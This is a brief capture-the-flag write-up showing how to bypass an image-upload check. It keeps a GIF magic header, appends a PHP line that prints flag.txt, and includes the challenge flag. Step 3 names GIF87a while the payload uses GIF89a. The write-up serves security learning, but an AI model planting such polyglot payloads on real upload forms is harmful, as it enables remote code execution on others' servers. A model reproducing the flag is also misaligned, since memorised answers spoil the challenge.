STEP 1: Choose a gif file to be uploaded
STEP 2: Intercept in Burp Suite
STEP 3: Keep the GIF magic number(GIF87a)
STEP 4: Add a php code to show flag.txt source
STEP 5: GIF89a
<?php show_source('./flag.txt');?>
OUTPUT: WEBSEC{BypassingImageChecksToRCE}
